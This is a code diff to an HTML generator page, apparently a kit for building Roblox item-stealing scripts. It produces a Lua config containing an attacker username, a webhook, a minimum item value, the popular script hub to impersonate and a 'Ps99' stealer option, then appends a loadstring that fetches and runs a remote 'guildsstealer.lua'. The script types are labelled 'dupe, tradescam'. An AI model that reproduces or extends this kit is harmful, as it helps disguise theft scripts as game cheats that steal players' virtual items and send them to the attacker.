@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Argon X Scripts</title>
+  <title>Argon X Scripts - Gui</title>
   <style>
     body {
         font-family: Arial, sans-serif;
@@ -117,9 +117,11 @@
         <option value="Nexus">Nexus</option>
         <option value="YARHM">YARHM</option>
       </select><br><br>
-      
+
       <label for="stealer">Stealer:</label>
-        <option value="dupe">Ps99</option>
+      <select id="stealer" name="stealer">
+        <option value="ps99">Ps99</option>
+        <!-- Add more options as needed -->
       </select><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
@@ -163,14 +165,16 @@
         }
 
         // Generate output string based on the new structure
-        const outputString = `config = {\n` +
-                             `    Username = "${username}", -- Username To Send Pets To\n` +
-                             `    Webhook = "${webhook}", -- Webhook URL\n` +
-                             `    MinimumRap = "${minimumRap}", -- Minimum RAP of each item you want to get sent to you\n` +
-                             `    typesui = "${typesui}", -- kavo, orion, fluent\n` +
-                             `    typescript = "${typescript}", -- dupe, tradescam\n` +
-                             `    scriptname = "${scriptname}", -- Overdrive H, Symphony Hub, Highlight Hub, Nexus Hub, Cleve Hub, Eclipse Hub, R3TH PRIV, AshbornnHub, Nexus, YARHM\n` +
-                             `    stealer = "${stealer}", -- ps99, SOON MM2 AND ADOPT ME\n` +
+        const outputString = `--generate\n` +
+                             `--website made by kizamies#0001/Shimm\n` +
+                             `config = {\n` +
+                             `    Username = "${username}",\n` +
+                             `    Webhook = "${webhook}",\n` +
+                             `    MinimumRap = "${minimumRap}",\n` +
+                             `    typesui = "${typesui}",\n` +
+                             `    typescript = "${typescript}",\n` +
+                             `    scriptname = "${scriptname}",\n` +
+                             `    stealer = "${stealer}",\n` +
                              `}\n\n` +
                              'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
 
